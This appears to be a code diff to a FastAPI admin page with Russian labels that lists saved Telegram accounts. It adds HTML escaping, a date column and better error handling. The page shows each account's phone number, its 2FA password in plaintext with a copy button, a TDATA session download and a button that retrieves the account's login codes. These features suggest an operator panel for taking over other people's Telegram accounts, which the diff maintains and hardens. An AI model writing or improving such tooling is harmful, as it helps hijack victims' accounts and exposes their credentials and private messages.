@@ -17,6 +17,7 @@ import tempfile
 import ipaddress
 import base64
 import aiohttp
+import html
 from datetime import datetime
 from pathlib import Path
 from fastapi import FastAPI, Request, Depends, HTTPException
@@ -472,6 +473,9 @@ async def get_codes(user_id: str, _=Depends(require_admin)):
 @app.get("/admin", response_class=HTMLResponse)
 async def admin_page(credentials: HTTPBasicCredentials = Depends(require_admin)):
     os.makedirs(SESSIONS_DIR, exist_ok=True)
+    admin_auth_token = base64.b64encode(
+        f"{credentials.username}:{credentials.password}".encode("utf-8")
+    ).decode("ascii")
 
     sessions_data = []
     for fname in sorted(os.listdir(SESSIONS_DIR)):
@@ -493,7 +497,7 @@ async def admin_page(credentials: HTTPBasicCredentials = Depends(require_admin))
         uname = f"@{d['username']}" if d.get("username") else ""
         fname = d.get("first_name", "") or ""
         twofa = d.get("password_2fa", "")
-        twofa_escaped = twofa.replace("'", "\\'")
+        saved_at = d.get("saved_at", "") or ""
 
         tdata_exists = os.path.exists(f"{TDATA_DIR}/{tg_account_id}")
         tdata_btn = (
@@ -507,26 +511,37 @@ async def admin_page(credentials: HTTPBasicCredentials = Depends(require_admin))
         if tg_account_id and tg_account_id != session_uid:
             id_caption += f" · tg {tg_account_id}"
 
+        display_name_html = html.escape(display_name)
+        id_caption_html = html.escape(id_caption)
+        phone_html = html.escape(d.get("phone", "") or "")
+        twofa_html = html.escape(twofa) if twofa else "—"
+        saved_at_html = html.escape(saved_at) if saved_at else "—"
+        session_uid_attr = html.escape(session_uid, quote=True)
+        twofa_attr = html.escape(twofa, quote=True)
+
         rows += f"""
         <tr>
           <td>
-            <div class="account-name">{display_name}</div>
-            <div class="account-id">{id_caption}</div>
-            <div class="account-phone">{d.get('phone', '')}</div>
+            <div class="account-name">{display_name_html}</div>
+            <div class="account-id">{id_caption_html}</div>
+            <div class="account-phone">{phone_html}</div>
           </td>
           <td class="twofa-cell">
-            {f'<span class="twofa-val" onclick="copyStr(\'{twofa_escaped}\')">{twofa} <span class="copy-hint">📋</span></span>' if twofa else '<span class="no-val">—</span>'}
+            {f'<button type="button" class="twofa-val" data-copy="{twofa_attr}">{twofa_html} <span class="copy-hint">📋</span></button>' if twofa else '<span class="no-val">—</span>'}
+          </td>
+          <td class="date-cell">
+            <div class="saved-at">{saved_at_html}</div>
           </td>
           <td>
             <div class="tdata-col">
               {tdata_btn}
-              <button class="code-btn" onclick="getCodes('{session_uid}', this)">📨 Получить код</button>
+              <button type="button" class="code-btn" data-uid="{session_uid_attr}">📨 Получить код</button>
             </div>
           </td>
         </tr>
-        <tr class="codes-row" id="codes-{session_uid}" style="display:none">
-          <td colspan="3">
-            <div class="codes-box" id="codes-box-{session_uid}"></div>
+        <tr class="codes-row" id="codes-{session_uid_attr}" style="display:none">
+          <td colspan="4">
+            <div class="codes-box" id="codes-box-{session_uid_attr}"></div>
           </td>
         </tr>"""
 
@@ -598,6 +613,8 @@ async def admin_page(credentials: HTTPBasicCredentials = Depends(require_admin))
   .account-name {{ font-size: 14px; font-weight: 500; color: #f1f1f3; }}
   .account-id {{ font-size: 11px; color: #6b6b7a; margin-top: 3px; font-family: monospace; }}
   .account-phone {{ font-size: 12px; color: #818cf8; margin-top: 2px; font-family: monospace; }}
+  .date-cell {{ min-width: 180px; }}
+  .saved-at {{ font-size: 12px; color: #a1a1aa; font-family: monospace; }}
   .tdata-col {{ display: flex; flex-direction: column; gap: 6px; align-items: flex-start; }}
   .code-btn {{
     background: rgba(34,211,165,0.1);
@@ -646,6 +663,9 @@ async def admin_page(credentials: HTTPBasicCredentials = Depends(require_admin))
     gap: 6px;
     padding: 4px 8px;
     border-radius: 6px;
+    border: none;
+    background: transparent;
+    font: inherit;
     transition: background 0.15s;
   }}
   .twofa-val:hover {{ background: rgba(34,211,165,0.1); }}
@@ -692,11 +712,12 @@ async def admin_page(credentials: HTTPBasicCredentials = Depends(require_admin))
     <tr>
       <th>Юзер | Айди</th>
       <th>2FA</th>
+      <th>Дата</th>
       <th>TDATA</th>
     </tr>
   </thead>
   <tbody>
-    {"<tr><td colspan='3' class='empty'>Нет сохранённых аккаунтов</td></tr>" if not sessions_data else rows}
+    {"<tr><td colspan='4' class='empty'>Нет сохранённых аккаунтов</td></tr>" if not sessions_data else rows}
   </tbody>
 </table>
 </div>
@@ -705,7 +726,7 @@ async def admin_page(credentials: HTTPBasicCredentials = Depends(require_admin))
 
 <script>
 // Авторизация для fetch-запросов (credentials встроены сервером)
-window._adminAuth = btoa('{credentials.username}:{credentials.password}');
+window._adminAuth = {json.dumps(admin_auth_token)};
 
 function copyStr(text) {{
   navigator.clipboard.writeText(text).then(() => {{
@@ -754,14 +775,29 @@ async function loadCodes(uid) {{
     const r = await fetch('/admin/codes/' + uid, {{
       headers: {{ 'Authorization': 'Basic ' + window._adminAuth }}
     }});
+    const raw = await r.text();
+    let data = null;
+    try {{
+      data = JSON.parse(raw);
+    }} catch (_e) {{
+      data = null;
+    }}
     if (r.status === 401) {{
       box.innerHTML = '<div class="codes-error">❌ Ошибка авторизации</div>';
       return;
     }}
-    const data = await r.json();
+    if (!r.ok) {{
+      const errText = data && data.detail ? data.detail : (data && data.error ? data.error : ('HTTP ' + r.status));
+      box.innerHTML = '<div class="codes-error">❌ ' + errText + '</div>';
+      return;
+    }}
+    if (!data) {{
+      box.innerHTML = '<div class="codes-error">❌ Сервер вернул не JSON</div>';
+      return;
+    }}
     renderCodes(uid, data);
   }} catch(e) {{
-    box.innerHTML = '<div class="codes-error">❌ Ошибка запроса</div>';
+    box.innerHTML = '<div class="codes-error">❌ Ошибка запроса: ' + (e.message || 'unknown') + '</div>';
   }}
 }}
 
@@ -774,6 +810,14 @@ function getCodes(uid, btn) {{
   row.style.display = '';
   loadCodes(uid);
 }}
+
+document.querySelectorAll('.code-btn[data-uid]').forEach(btn => {{
+  btn.addEventListener('click', () => getCodes(btn.dataset.uid, btn));
+}});
+
+document.querySelectorAll('.twofa-val[data-copy]').forEach(btn => {{
+  btn.addEventListener('click', () => copyStr(btn.dataset.copy));
+}});
 </script>
 </body>
 </html>"""
